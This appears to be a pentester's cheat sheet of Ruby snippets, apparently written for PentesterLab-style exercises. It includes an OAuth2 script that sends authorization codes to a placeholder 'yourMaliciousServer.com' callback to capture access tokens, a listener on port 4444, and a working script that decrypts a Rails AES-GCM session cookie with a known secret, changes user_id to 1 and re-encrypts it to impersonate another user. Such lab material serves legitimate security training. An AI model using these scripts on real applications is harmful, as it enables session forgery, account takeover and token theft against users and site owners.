## CODE EXAMPLES

### DECODING
- URL-Decode in Ruby: `require 'uri'; URI.decode("http%3A%2F%2Fexample.com%2F%3Fa%3Druby%20uri%20decode")`

<br />

### OAUTH2 TOKEN 
- Firstly, `gem install oauth2`
```
require 'oauth2'

callback = "http://yourMaliciousServer.com"
app_id = " "

secret = " "
client = OAuth2::Client.new(app_id, secret, site: "http://authorization-server.com")
client.auth_code.authorize_url(redirect_uri: callback)


code = " "
access = client.auth_code.get_token( code, redirect_uri: callback)
access.get("/api/user").parsed

puts access.token
```

<br />

### PROXY
- More Advanced: [https://gist.github.com/jhnbwrs/dff50c0c9515f2358ac0](https://gist.github.com/jhnbwrs/dff50c0c9515f2358ac0)
```
# REQ: sudo gem install sinatra

require 'net/http'
require 'uri'
require 'sinatra'

set :port, 4444
set :bind, '0.0.0.0'

get '/' do
  uri = URI("http://...")
  resp = Net::HTTP.get_response(uri)
  loc = resp.header['location']
  text = "Hello Visitor!"
end
```

### RUBY ON RAILS: AES-GCM SIGNED SESSION 
- Helpful: [https://emanual.github.io/ruby-docs](https://emanual.github.io/ruby-docs/classes/OpenSSL/Cipher/CipherError.html)
```
require 'uri'
require 'cgi'
require 'base64'
require 'openssl'

cookie = URI.decode("iowp3WAChN4G....TmF9TMUgkDepg%3D--xguco..6khpC--wdizT8Aw..3D%3D")

def secret()
    secret = Digest::MD5.hexdigest("PentesterLab::Application")
    OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
    end

def decrypt(cookie)
    cipher = OpenSSL::Cipher.new("aes-256-gcm")
    encrypted_data, iv, auth_tag = cookie.split("--".freeze).map { |v| ::Base64.strict_decode64(v) }
    cipher.decrypt
    cipher.key = secret()
    cipher.iv  = iv
    cipher.auth_tag = auth_tag
    cipher.auth_data = ""
    decrypted_data = cipher.update(encrypted_data) + cipher.final
    end

def encrypt(string)
    cipher = OpenSSL::Cipher.new("aes-256-gcm")
    cipher.encrypt
    cipher.key = secret()
    iv = cipher.random_iv
    cipher.auth_data = ""
    encrypted_data = cipher.update(string) + cipher.final
    blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
    blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
    blob
    end

string = decrypt(cookie)
string = string.sub! '"user_id":2', '"user_id":1'
puts CGI.escape(encrypt(string))


# Example string = {"session_id":"7ee48973...952f595","_csrf_token":"+UV6rbAMo6QW...6lAGP8=","user_id":1}
# Output: 6k5xPNUYdUbZX9eH...BGZ%2BfyPvi9CU%2BZOD5qKVc%3D--61raV%2BxHyFVR4Rv3--KiSR%2F9hZqMfntNewcCm9kQ%3D%3D
```
